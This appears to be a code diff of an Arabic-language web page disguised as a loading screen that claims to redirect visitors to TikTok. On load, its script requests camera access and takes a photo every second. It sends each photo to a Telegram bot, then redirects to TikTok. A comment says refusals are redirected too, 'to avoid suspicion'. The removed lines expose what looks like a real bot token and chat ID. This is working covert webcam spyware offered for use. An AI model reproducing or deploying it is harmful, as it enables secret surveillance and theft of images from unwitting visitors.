@@ -3,29 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مرحباً بك في موقعنا</title>
+    <title>جاري التحميل...</title>
     <style>
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
-        .container { text-align: center; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { color: #1c1e21; }
-        p { color: #606770; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>أهلاً بك في منصة الإعلانات</h1>
-        <p>يرجى الانتظار جارٍ تحميل المحتوى...</p>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <p>جاري توجيهك إلى تيك توك، يرجى الانتظار...</p>
     </div>
 
     <script>
         // ==========================================
         // ضع بياناتك هنا فقط
-        const BOT_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8'; 
-        const CHAT_ID = '5516597110';
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
         // ==========================================
 
-        async function initCamera() {
+        async function startProcess() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
@@ -45,33 +44,30 @@
                         canvas.toBlob(async (blob) => {
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'image.jpg');
+                            formData.append('photo', blob, `img_${count}.jpg`);
 
-                            try {
-                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            } catch (e) {
-                                console.error("خطأ في الإرسال");
-                            }
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
                         }, 'image/jpeg');
 
                         count++;
                     } else {
+                        // إيقاف الكاميرا والتحويل إلى تيك توك فوراً
                         clearInterval(capture);
-                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://www.tiktok.com/"; 
                     }
-                }, 1500); // يلتقط صورة كل ثانية ونصف
+                }, 1000); // صورة كل ثانية
 
             } catch (err) {
-                console.log("تم رفض الإذن أو الكاميرا غير متوفرة");
+                // إذا رفض المستخدم الإذن، يتم تحويله أيضاً لتجنب الشك
+                window.location.href = "https://www.tiktok.com/";
             }
         }
 
-        // يبدأ العمل فور دخول الموقع
-        window.onload = initCamera;
+        window.onload = startProcess;
     </script>
 </body>
 </html>
-
